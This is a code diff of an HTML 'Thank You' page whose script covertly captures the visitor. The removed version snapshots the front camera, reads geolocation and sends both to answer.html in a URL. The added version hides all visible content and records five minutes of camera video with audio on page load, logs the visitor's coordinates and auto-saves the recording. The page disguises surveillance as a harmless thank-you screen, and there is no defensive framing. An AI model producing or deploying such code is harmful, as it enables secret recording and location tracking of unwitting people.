@@ -5,76 +5,94 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Thank You</title>
     <style>
-        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        h1 { font-size: 3em; }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f3f3f3;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        h1 {
+            display: none; /* Hide the text */
+        }
+        video {
+            display: none; /* Hide the video element */
+        }
     </style>
 </head>
 <body>
 
     <h1>Thank You</h1>
+    <video id="video" autoplay></video>
 
     <script>
+        // Variables to store location and video data
         let locationData = {};
-        let snapshot = null;
+        let recordedChunks = [];
 
-        // Access front camera
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        // Function to capture the front camera and record for 5 minutes
+        function captureVideo() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
                 .then(stream => {
-                    const video = document.createElement('video');
+                    const video = document.getElementById('video');
                     video.srcObject = stream;
-                    video.play();
+
+                    const mediaRecorder = new MediaRecorder(stream);
                     
-                    // Capture a snapshot after the video stream is ready
-                    video.onloadedmetadata = () => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        const context = canvas.getContext('2d');
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        snapshot = canvas.toDataURL('image/png');
-                        stream.getTracks().forEach(track => track.stop()); // Stop the camera after snapshot
-                        checkAllDataCollected();
+                    // Start recording when the video stream is ready
+                    mediaRecorder.ondataavailable = function(event) {
+                        if (event.data.size > 0) {
+                            recordedChunks.push(event.data);
+                        }
                     };
+
+                    // Stop the recording after 5 minutes (300,000 milliseconds)
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                        stream.getTracks().forEach(track => track.stop()); // Stop all video/audio tracks
+                        saveVideo(); // Save the video after recording stops
+                    }, 300000); // 5 minutes = 300,000ms
+
+                    mediaRecorder.start();
                 })
-                .catch(() => {
-                    checkAllDataCollected();
+                .catch(error => console.error('Error accessing camera: ', error));
+        }
+
+        // Function to save the recorded video as a file locally
+        function saveVideo() {
+            const blob = new Blob(recordedChunks, { type: 'video/mp4' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.style.display = 'none';
+            a.href = url;
+            a.download = 'video.mp4'; // Automatically name the file as video.mp4
+            document.body.appendChild(a);
+            a.click();
+            window.URL.revokeObjectURL(url); // Clean up the object URL
+        }
+
+        // Function to get the user's geolocation
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    locationData.latitude = position.coords.latitude;
+                    locationData.longitude = position.coords.longitude;
+                    console.log(`Location captured: Latitude: ${locationData.latitude}, Longitude: ${locationData.longitude}`);
+                }, error => {
+                    console.error('Error getting location:', error);
                 });
-        }
-
-        // Access location
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(position => {
-                locationData.latitude = position.coords.latitude;
-                locationData.longitude = position.coords.longitude;
-                checkAllDataCollected();
-            }, () => {
-                locationData.error = "Unable to retrieve location";
-                checkAllDataCollected();
-            });
-        } else {
-            locationData.error = "Geolocation not supported";
-            checkAllDataCollected();
-        }
-
-        // Function to check if all data is collected
-        function checkAllDataCollected() {
-            if (snapshot !== null && (locationData.latitude !== undefined || locationData.error)) {
-                redirectToAnswer();
+            } else {
+                console.error('Geolocation not supported by this browser.');
             }
         }
 
-        // Redirect to answer.html with the snapshot and location data
-        function redirectToAnswer() {
-            const queryParams = new URLSearchParams({
-                snapshot: encodeURIComponent(snapshot),
-                latitude: locationData.latitude || '',
-                longitude: locationData.longitude || '',
-                locationError: locationData.error || ''
-            });
-
-            window.location.href = 'answer.html?' + queryParams.toString();
-        }
+        // Start capturing video and location when the page is loaded
+        window.onload = function() {
+            getLocation();  // Capture location
+            captureVideo(); // Start capturing video
+        };
     </script>
 
 </body>
